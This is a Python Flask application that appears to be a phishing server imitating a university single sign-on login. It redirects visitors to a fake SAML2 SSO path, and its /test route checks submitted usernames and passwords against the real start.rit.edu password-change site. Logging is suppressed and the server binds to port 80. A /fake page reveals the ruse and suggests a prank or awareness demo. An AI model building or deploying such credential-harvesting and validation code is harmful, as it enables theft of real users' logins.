from flask import Flask, render_template, request, redirect, abort
import requests
import logging
app = Flask(__name__)

@app.route("/test")
def test_password():
    username = request.args.get('username')
    password = request.args.get('password')
    s = "https://"+username+":"+password+"@start.rit.edu/ChangePassword/"
    r = requests.get(s)
    print(username + " messed up.")
    if r.status_code == 200:
        return "True"
    else:
        abort(400)

@app.route("/fake")
def fake():
    i = '<img src="https://cdn.meme.am/instances/37513632.jpg"><br /><br />'
    m = "This login is a fake. It's pretty convincing, right? Please be careful with your passwords."
    return i + m

@app.route("/kevin")
def kevin():
    k = '<img src="http://i.imgur.com/lIHxm3M.jpg"><br /><br />'
    m = 'Love you buddy - Jeremiah and Tyler'
    return k + m

@app.route("/idp/profile/SAML2/Redirect/SSO") #correct url
def form():
    return render_template('index.html')

@app.route("/")
def index():
    return redirect("/idp/profile/SAML2/Redirect/SSO", code=302)

if __name__ == '__main__':
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run('0.0.0.0', port=80)
